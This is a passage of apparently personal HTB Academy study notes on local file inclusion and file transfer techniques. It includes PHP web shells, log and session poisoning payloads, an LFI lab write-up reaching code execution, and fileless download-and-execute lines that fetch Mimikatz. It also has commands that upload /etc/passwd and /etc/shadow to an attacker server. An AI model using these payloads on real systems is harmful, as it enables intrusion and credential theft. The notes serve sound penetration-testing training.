$phar-&gt;addFromString('shell.txt', '&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;'); $phar-&gt;setStub('&lt;?php __HALT_COMPILER(); ?&gt;'); $phar-&gt;stopBuffering();   We can compile it into a phar file and later rename it to an image:  php --define phar.readonly=0 shell.php &amp;&amp; mv shell.phar shell.jpg   And similarly include it:  http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&amp;cmd=id  ","version":"Next","tagName":"h2"},{"title":"Log poisoning​","type":1,"pageTitle":"File inclusion","url":"/docs/Hacking/HTB Academy/File inclusion#log-poisoning","content":" This types of attacks rely on importing functions that have the Execute privileges. The main idea is that if we are aware of any info that is logged to a file, we can send our malicious payload so that it gets logged. Then, we'll import the poisoned log to be executed.  ","version":"Next","tagName":"h2"},{"title":"PHP Session poisoning​","type":1,"pageTitle":"File inclusion","url":"/docs/Hacking/HTB Academy/File inclusion#php-session-poisoning","content":" Similar to log poisoning, session data is stored in files in /var/lib/php/sessions/ on Linux and in C:\\Windows\\Temp\\ on Windows. E.g, if the PHPSESSIONID is el4ukv0kqbvoirg7nkp4dncpk3, the location in the disk will be /var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3.  http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd  Now, we should look for some value in the session that is under our control. For example, language.  We can write a URL-encoded web shell in language:  http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E.  Then, when we visit the page with the session LFI, we'll get Remote Code Execution:  http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&amp;cmd=id  ","version":"Next","tagName":"h2"},{"title":"Server log poisoning​","type":1,"pageTitle":"File inclusion","url":"/docs/Hacking/HTB Academy/File inclusion#server-log-poisoning","content":" We can abuse Apache or Nginx access or error logs to inject some malicious PHP that will be imported with the LFI vulnerability.  We can control the User-Agent of our client, therefore, we can send a request with User-Agent header with the web shell:  adriangalera@htb[/htb]$ echo -n &quot;User-Agent: &lt;?php system(\\$_GET['cmd']); ?&gt;&quot; &gt; Poison adriangalera@htb[/htb]$ curl -s &quot;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php&quot; -H @Poison   The poisoning technique might be used for SSH, mail or ftp logs.  We should determine first if we have access to the files using the LFI.  ","version":"Next","tagName":"h2"},{"title":"Fuzzing parameters​","type":1,"pageTitle":"File inclusion","url":"/docs/Hacking/HTB Academy/File inclusion#fuzzing-parameters","content":" Usually, the parameters in forms and such are well protected. However, there might be hidden parameters not well secured and vulnerable to LFI.  Example with fuff:  ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?FUZZ=value'   We can find good wordlists for LFI seclists: Fuzzing/LFI and LFI-Jhaddix.  We can use the LFI to discover the contents of the server, for example identifying the server root. For example:  ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../FUZZ/index.php'   Depending on our LFI situation, we may need to add a few back directories (e.g. ../../../../), and then add our index.php afterwords.  Same technique can be leveraged to find server configuration or logs. For example, these two wordlists https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux and https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows allows to reveal several configuration and log files.  ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../FUZZ'   ","version":"Next","tagName":"h2"},{"title":"Skills assessment​","type":1,"pageTitle":"File inclusion","url":"/docs/Hacking/HTB Academy/File inclusion#skills-assessment","content":" This is the write-up for the assessment of HTB academy File inclusion module.  This a little bit tricky because we know which vulnerability to exploit here: file inclusion.  whatweb 94.237.49.11:31840/index.php http://94.237.49.11:31840/index.php [200 OK] Bootstrap, Country[FINLAND][FI], HTML5, HTTPServer[nginx/1.18.0], IP[94.237.49.11], JQuery[3.3.1], PHP[7.3.22], Script, Title[InlaneFreight], X-Powered-By[PHP/7.3.22], nginx[1.18.0]   whatweb reveals we're dealing with a PHP/7.3.22 page served by an nginx/1.18.0.  While navigating as a regular user in the website, we can see the URL has a page parameter which looks promising for LFI vulnerability.  Visiting http://94.237.49.11:31840/index.php?page=industries../ shows Invalid input detected! which is the contents of error.php page.  Let's try the basic bypasses:  Double the input: ./ become ..//. NothingURL encode the symbols: nothingTry to escape the approve path: N/A because the pages are in rootPath truncation: N/A PHP version is recentNull byte: N/A PHP version is recent  Let's try with more complex bypasses:  http://94.237.49.11:31840/index.php?page=php://filter/read=convert.base64-encode/resource=main  Worked and return the content of the main.php in base64  In index.php we discover a commented piece of code that makes reference to ilf_admin/index.php. If we try to access that page, we get something interesting showing some logs. Worth remembering: http://94.237.49.11:31840/ilf_admin/index.php?log=system.log  The filtering mechanism looks quite simple:   $page = $_GET['page']; if (strpos($page, &quot;..&quot;) !== false) { include &quot;error.php&quot;; } else { include $page . &quot;.php&quot;; }   http://94.237.49.11:31840/index.php?page=%252e%252e%252fetc%252fpasswd  Looks like might be vulnerable to double encoding, however we're only bypassing the first if and the include only let us include php files.  Let's get back to http://94.237.49.11:31840/ilf_admin/index.php  We can try to brute-force some directories:  ffuf -w /opt/github/SecLists/Discovery/Web-Content/combined_directories.txt:FUFF -u http://94.237.49.11:31840/ilf_admin/FUFF.php ffuf -w /opt/github/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://94.237.49.11:31840/ilf_admin/index.php?FUZZ=value' -fl 102   Nothing revealed.  However, we can try the LFI directly in the log paramter:  http://94.237.49.11:31840/ilf_admin/index.php?log=../../error.php and it worked!  http://94.237.49.11:31840/ilf_admin/index.php?log=../../../../../etc/passwd we have read the passwd file!  In order to have Remote Code Excecution, let's try to see if we can have Remote File Inclusion and add our shell.  We cannot include Remote files, checking the nginx error log, looks like they might be using file_get_contents or something like this.  Given we have access to logs, we can poison them and force ilf_admin to execute them by setting the user-agent of curl:  curl -s &quot;http://94.237.59.185:42603/index.php&quot; -A &quot;&lt;?php system($_GET['cmd']); ?&gt;&quot;   And now we have a web shell running in the logs page:  http://94.237.59.185:42603/ilf_admin/index.php?log=../../../../../var/log/nginx/access.log&amp;cmd=id  From here we can move to a reverse shell ","version":"Next","tagName":"h2"},{"title":"File transfer","type":0,"sectionRef":"#","url":"/docs/Hacking/HTB Academy/File transfers","content":"","keywords":"","version":"Next"},{"title":"Windows​","type":1,"pageTitle":"File transfer","url":"/docs/Hacking/HTB Academy/File transfers#windows","content":" ","version":"Next","tagName":"h2"},{"title":"Base64​","type":1,"pageTitle":"File transfer","url":"/docs/Hacking/HTB Academy/File transfers#base64","content":" If the file is not very large, we can encoded in Base64 in one end, paste it in the console and decode it in the other side. It's important to check the file hash are the same on both ends to ensure the transfer was successful.  For example, we are transfering an RSA key:  adriangalera@htb[/htb]$ md5sum id_rsa 4e301756a07ded0a2dd6953abf015278 id_rsa adriangalera@htb[/htb]$ cat id_rsa |base64 -w 0;echo LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=   In Windows Powershell:  PS C:\\htb&gt; [IO.File]::WriteAllBytes(&quot;C:\\Users\\Public\\id_rsa&quot;, [Convert]::FromBase64String(&quot;LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=&quot;))   PS C:\\htb&gt; Get-FileHash C:\\Users\\Public\\id_rsa -Algorithm md5  Algorithm Hash Path    MD5 4E301756A07DED0A2DD6953ABF015278 C:\\Users\\Public\\id_rsa  This method might not always be possible. Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters.  The same mechanism can be used to download or to upload files.  ","version":"Next","tagName":"h3"},{"title":"Powershell Web Downloads​","type":1,"pageTitle":"File transfer","url":"/docs/Hacking/HTB Academy/File transfers#powershell-web-downloads","content":" Downloadfile(Async)​  PS C:\\htb&gt; # Example: (New-Object Net.WebClient).DownloadFile('&lt;Target File URL&gt;','&lt;Output File Name&gt;') PS C:\\htb&gt; (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\\Users\\Public\\Downloads\\PowerView.ps1') PS C:\\htb&gt; # Example: (New-Object Net.WebClient).DownloadFileAsync('&lt;Target File URL&gt;','&lt;Output File Name&gt;') PS C:\\htb&gt; (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\\Users\\Public\\Downloads\\PowerViewAsync.ps1')   PowerShell DownloadString - Fileless Method​  As we previously discussed, fileless attacks work by using some operating system functions to download the payload and execute it directly. PowerShell can also be used to perform fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the Invoke-Expression cmdlet or the alias IEX.  PS C:\\htb&gt; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')   PS C:\\htb&gt; (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX   PowerShell Invoke-WebRequest​  PS C:\\htb&gt; Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1   You can use the aliases iwr, curl, and wget instead of the Invoke-WebRequest full name.  There are two main sources of issues while downloading stuff from PowerShell:  Internet Explorer is not yet configured. You can use -UseBasicParsing to bypass this.  Invoke-WebRequest https://&lt;ip&gt;/PowerView.ps1 -UseBasicParsing | IEX   Errors related with SSL/TLS when certificate is not trusted. The solution is to execute this  PS C:\\htb&gt; [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}   ","version":"Next","tagName":"h3"},{"title":"SMB Downloads​","type":1,"pageTitle":"File transfer","url":"/docs/Hacking/HTB Academy/File transfers#smb-downloads","content":" You can use SMB server in the attacker machine:  sudo impacket-smbserver share -smb2support /tmp/smbshare # with username/password sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test   And use smb to download it in the victim:  copy \\\\192.168.220.133\\share\\nc.exe   With usernmae/password:  net use n: \\\\192.168.220.133\\share /user:test test copy n:\\nc.exe   ","version":"Next","tagName":"h3"},{"title":"FTP Downloads​","type":1,"pageTitle":"File transfer","url":"/docs/Hacking/HTB Academy/File transfers#ftp-downloads","content":" Run pyftpdlib FTP server in the attacker  sudo python3 -m pyftpdlib --port 21   PS C:\\htb&gt; (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\\Users\\Public\\ftp-file.txt')   Or create a command file to download the file:  C:\\htb&gt; echo open 192.168.49.128 &gt; ftpcommand.txt C:\\htb&gt; echo USER anonymous &gt;&gt; ftpcommand.txt C:\\htb&gt; echo binary &gt;&gt; ftpcommand.txt C:\\htb&gt; echo GET file.txt &gt;&gt; ftpcommand.txt C:\\htb&gt; echo bye &gt;&gt; ftpcommand.txt # Let's execute the command C:\\htb&gt; ftp -v -n -s:ftpcommand.txt # Let's verify more file.txt   ","version":"Next","tagName":"h3"},{"title":"PowerShell Web Uploads​","type":1,"pageTitle":"File transfer","url":"/docs/Hacking/HTB Academy/File transfers#powershell-web-uploads","content":" Most of the webserver need to be configured to accept uploads. To make thing easier, it exists the python uploadserver module, which is an extension of the http.server module:  python3 -m uploadserver   Now, we can use a PS script to do the upload. First we download and execcute the setup script. Later, we execute the Invoke-FileUpload.  PS C:\\htb&gt; IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1') PS C:\\htb&gt; Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\\Windows\\System32\\drivers\\etc\\hosts   Another option is to have nc listening and use Invoke-WebRequest in the Windows machine.  Attacker:  nc -lvnp 8000   Victim:  PS C:\\htb&gt; $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\\Windows\\System32\\drivers\\etc\\hosts' -Encoding Byte)) PS C:\\htb&gt; Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64   ","version":"Next","tagName":"h3"},{"title":"SMB Uploads​","type":1,"pageTitle":"File transfer","url":"/docs/Hacking/HTB Academy/File transfers#smb-uploads","content":" Most firewall might block the SMB port. An alternative SMB can be run over HTTP using WebDAV. When you use SMB, it will first attempt to connect using the SMB protocol, and if there's no SMB share available, it will try to connect using HTTP.  In the attacker machine, we can run a WebDAV server:  sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous   In the Windows machine, we can use the server as it was SMB:  dir \\\\192.168.49.128\\DavWWWRoot copy C:\\Users\\john\\Desktop\\SourceCode.zip \\\\192.168.49.129\\DavWWWRoot\\ copy C:\\Users\\john\\Desktop\\SourceCode.zip \\\\192.168.49.129\\sharefolder\\   DavWWWRoot is a special keyword recognized by the Windows Shell. You can use an existing folder if you want to avoid this keyword.  ","version":"Next","tagName":"h3"},{"title":"FTP Uploads​","type":1,"pageTitle":"File transfer","url":"/docs/Hacking/HTB Academy/File transfers#ftp-uploads","content":" Let's run ftp server in the attacker machine:  sudo python3 -m pyftpdlib --port 21 --write   And now execute the upload:  PS C:\\htb&gt; (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\\Windows\\System32\\drivers\\etc\\hosts')   or create and execute a command:  C:\\htb&gt; echo open 192.168.49.128 &gt; ftpcommand.txt C:\\htb&gt; echo USER anonymous &gt;&gt; ftpcommand.txt C:\\htb&gt; echo binary &gt;&gt; ftpcommand.txt C:\\htb&gt; echo PUT c:\\windows\\system32\\drivers\\etc\\hosts &gt;&gt; ftpcommand.txt C:\\htb&gt; echo bye &gt;&gt; ftpcommand.txt # Now execute the command C:\\htb&gt; ftp -v -n -s:ftpcommand.txt   ","version":"Next","tagName":"h3"},{"title":"Linux​","type":1,"pageTitle":"File transfer","url":"/docs/Hacking/HTB Academy/File transfers#linux","content":" ","version":"Next","tagName":"h2"},{"title":"Base64​","type":1,"pageTitle":"File transfer","url":"/docs/Hacking/HTB Academy/File transfers#base64-1","content":" The same encoding/decoding mechanism can be used to transfer files in Linux.  Verify the encode base64  md5sum id_rsa cat id_rsa |base64 -w 0;echo   Copy the base64, decode and verify the hash  adriangalera@htb[/htb]$ echo -n 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=' | base64 -d &gt; id_rsa md5sum id_rsa   ","version":"Next","tagName":"h3"},{"title":"curl/wget​","type":1,"pageTitle":"File transfer","url":"/docs/Hacking/HTB Academy/File transfers#curlwget","content":" wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh   ","version":"Next","tagName":"h3"},{"title":"Fileless operations​","type":1,"pageTitle":"File transfer","url":"/docs/Hacking/HTB Academy/File transfers#fileless-operations","content":" Thanks to the Linux pipes, we can execute a file without the need to download it:  curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash   The same can be done with wget:  wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3   ","version":"Next","tagName":"h3"},{"title":"Download with Bash​","type":1,"pageTitle":"File transfer","url":"/docs/Hacking/HTB Academy/File transfers#download-with-bash","content":" Sometimes curl nor wget are available, in this case the built-in /dev/tcp bash device can be used.  # Connect to the server exec 3&lt;&gt;/dev/tcp/10.10.10.32/80 # Perform the GET request echo -e &quot;GET /LinEnum.sh HTTP/1.1\\n\\n&quot;&gt;&amp;3 # Print the response cat &lt;&amp;3   ","version":"Next","tagName":"h3"},{"title":"SSH​","type":1,"pageTitle":"File transfer","url":"/docs/Hacking/HTB Academy/File transfers#ssh","content":" Make sure there's a SSH server running on the other side. Then use scp:  scp plaintext@192.168.49.128:/root/myroot.txt .   scp can be used as well to upload files:  scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/   ","version":"Next","tagName":"h3"},{"title":"Web upload​","type":1,"pageTitle":"File transfer","url":"/docs/Hacking/HTB Academy/File transfers#web-upload","content":" We can use uploadserver in the same way as mentioned before in the Windows section. We can configure uploadserver to work under HTTPS.  Create a self-signed certificate and start the server using the certificate.  openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server' sudo python3 -m uploadserver 443 --server-certificate ~/server.pem   Now in the victim machine, we just need to pass the --insecure flag:  curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure   ","version":"Next","tagName":"h3"},{"title":"Multiple web servers​","type":1,"pageTitle":"File transfer","url":"/docs/Hacking/HTB Academy/File transfers#multiple-web-servers","content":" There are many ways to start a web server in multiple programming languages:  Python3: python3 -m http.serverPython2: python2.7 -m SimpleHTTPServerPHP: php -S 0.0.0.0:8000Ruby: ruby -run -ehttpd . -p8000  ","version":"Next","tagName":"h3"},{"title":"Transfer files with code​","type":1,"pageTitle":"File transfer","url":"/docs/Hacking/HTB Academy/File transfers#transfer-files-with-code","content":" So far, we have seen ways of moving files using existing tools. However, we can leverage the use of programming languges to transfer data as well.  Python 2.7:  python2.7 -c 'import urllib;urllib.urlretrieve (&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;, &quot;LinEnum.sh&quot;)'   Python3:  python3 -c 'import urllib.request;urllib.request.urlretrieve(&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;, &quot;LinEnum.sh&quot;)'   PHP:  php -r '$file = file_get_contents(&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;); file_put_contents(&quot;LinEnum.sh&quot;,$file);'   Using fopen:  php -r 'const BUFFER = 1024; $fremote = fopen(&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;, &quot;rb&quot;); $flocal = fopen(&quot;LinEnum.sh&quot;, &quot;wb&quot;); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'   Download the file and execute it directly  php -r '$lines = @file(&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;); foreach ($lines as $line_num =&gt; $line) { echo $line; }' | bash   Ruby:  ruby -e 'require &quot;net/http&quot;; File.write(&quot;LinEnum.sh&quot;, Net::HTTP.get(URI.parse(&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;)))'   Perl:  adriangalera@htb[/htb]$ perl -e 'use LWP::Simple; getstore(&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;, &quot;LinEnum.sh&quot;);'   Javascript (for Windows):  var WinHttpReq = new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;); WinHttpReq.Open(&quot;GET&quot;, WScript.Arguments(0), /*async=*/false); WinHttpReq.Send(); BinStream = new ActiveXObject(&quot;ADODB.Stream&quot;); BinStream.Type = 1; BinStream.Open(); BinStream.Write(WinHttpReq.ResponseBody); BinStream.SaveToFile(WScript.Arguments(1));   Save it as wget.js  C:\\htb&gt; cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1   Visual Basic (VBScript)  dim xHttp: Set xHttp = createobject(&quot;Microsoft.XMLHTTP&quot;) dim bStrm: Set bStrm = createobject(&quot;Adodb.Stream&quot;) xHttp.Open &quot;GET&quot;, WScript.Arguments.Item(0), False xHttp.Send with bStrm .type = 1 .open .write xHttp.responseBody .savetofile WScript.Arguments.Item(1), 2 end with   Save it as wget.vbs and use it:  C:\\htb&gt; cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1   We can use any programming language to perform upload operations, for example Python:  python3 -c 'import requests;requests.post(&quot;http://192.168.49.128:8000/upload&quot;,files={&quot;files&quot;:open(&quot;/etc/passwd&quot;,&quot;rb&quot;)})'   ","version":"Next","tagName":"h2"},{"title":"Other transfers​","type":1,"pageTitle":"File transfer","url":"/docs/Hacking/HTB Academy/File transfers#other-transfers","content":" ","version":"Next","tagName":"h2"},{"title":"Netcat (nc)​","type":1,"pageTitle":"File transfer","url":"/docs/Hacking/HTB Academy/File transfers#netcat-nc","content":" Victim machine:  nc -l -p 8000 &gt; SharpKatz.exe   Attacker machine:  adriangalera@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe adriangalera@htb[/htb]$ nc -q 0 192.168.49.128 8000 &lt; SharpKatz.exe   There might be variations of the commands to use depending if the binary is nc or ncat.  Additionally, we can have nc + /dev/tcp combination:  cat &lt; /dev/tcp/192.168.49.128/443 &gt; SharpKatz.exe   This will download to the IP, download file and save it as SharpKatz.exe.  ","version":"Next","tagName":"h3"},{"title":"WinRM​","type":1,"pageTitle":"File transfer","url":"/docs/Hacking/HTB Academy/File transfers#winrm","content":" WinRM is some sort of SSH for Windows.  To start, confirm the connection can be executed with WinRM:  PS C:\\htb&gt; Test-NetConnection -ComputerName DATABASE01 -Port 5985 ComputerName : DATABASE01 RemoteAddress : 192.168.1.101 RemotePort : 5985 InterfaceAlias : Ethernet0 SourceAddress : 192.168.1.100 TcpTestSucceeded : True   Now, we'll define a session variable that we can reuse:  $Session = New-PSSession -ComputerName DATABASE01   